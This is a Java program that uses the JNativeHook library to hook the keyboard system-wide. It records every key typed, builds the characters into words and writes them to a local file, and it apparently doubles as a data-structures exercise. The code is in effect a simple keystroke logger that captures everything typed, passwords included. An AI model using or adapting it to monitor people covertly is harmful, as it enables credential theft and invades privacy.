import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
/*
 * VC_A = means virtual code for A in the library
 * raw-code = asci of the chars
 * */
import java.io.*;
import java.util.Stack;

public class Main implements NativeKeyListener {
    static Queue<Character> queue;
    static LinkedList<String> linkedList;
    static Stack<String> stack;
    static StringBuilder word;

    Main() {
        queue = new Queue<>();
        linkedList = new LinkedList<>();
        stack = new Stack<>();
        word = new StringBuilder();
    }

    /*
     * NativeKeyEvents just for special keys, like fun, shift, enter, alt
     * Virtual code for the graphical keys are given below for reference (inclusive range)
     *
     * 2-11, 16-25, 30-38, 44-50
     *
     * We want to print "pressed keys" only when a special key is pressed, not all the time
     * Short Summary,
     *
     *   keyPressed - when the key goes down
     *   keyReleased - when t key comes up
     *   keyTyped - when the unicode character represented by this key is sent by the keyboard to system input.
     *
     * */

    // key code is the virtual code assigned to each special key to generate their words counterpart

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new Main());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        int keyCode = nativeKeyEvent.getKeyCode();
        // print only when there is a special key
        if (!(keyCode >= 2 && keyCode <= 11 || keyCode >= 16 && keyCode <= 25 || keyCode >= 30 && keyCode <= 38 || keyCode >= 44 && keyCode <= 50)) {
            System.out.println("Key Pressed : " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
            stack.push(NativeKeyEvent.getKeyText(keyCode));
            if (keyCode != NativeKeyEvent.VC_SPACE) {
                for (char c : NativeKeyEvent.getKeyText(keyCode).toCharArray()) {
                    queue.enqueue(c);
                }
            }
        }
        if (keyCode == NativeKeyEvent.VC_ENTER || keyCode == NativeKeyEvent.VC_SPACE || keyCode == NativeKeyEvent.VC_PERIOD || keyCode == NativeKeyEvent.VC_BACKSPACE) {
            while (!queue.isEmpty()) word.append(queue.remove());
            linkedList.add(word.toString());
            System.out.println("Resultant Linked List : " + linkedList);
            writeToFile();
            word.setLength(0);
        }
    }


    // raw code is the asci of the character being typed
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        if (e.getRawCode() >= 27 && e.getRawCode() <= 127) {
            // add all typed characters to the queue
            queue.enqueue(e.getKeyChar());
            System.out.println("KeyTyped : \"" + e.getKeyChar() + "\" ");
        }
    }

    void writeToFile() {
        try (FileWriter fw = new FileWriter(new File(".\\src\\win.txt"), false)) {
            fw.write(linkedList.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}